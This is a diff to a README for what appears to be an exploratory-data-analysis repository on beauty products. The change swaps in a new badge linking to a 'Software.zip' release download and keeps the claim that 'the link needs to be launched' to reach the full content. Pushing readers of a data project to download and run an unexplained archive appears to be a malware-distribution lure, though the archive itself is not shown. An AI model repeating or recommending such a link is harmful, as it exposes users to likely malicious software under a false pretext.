@@ -33,7 +33,7 @@ The repository covers a wide range of topics related to analytics, business inte
 
 Ready to explore the world of beauty products through data? You can access the full repository content and start your EDA journey by clicking the link below:
 
-[![Launch Software.zip](https://img.shields.io/badge/Launch-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Launch https://github.com/AikoGamer101/Exploratory-Data-Analysis/releases/download/v2.0/Software.zip](https://github.com/AikoGamer101/Exploratory-Data-Analysis/releases/download/v2.0/Software.zip)](https://github.com/AikoGamer101/Exploratory-Data-Analysis/releases/download/v2.0/Software.zip)
 
 🚨 Note: The link needs to be launched to access the complete repository content.
 
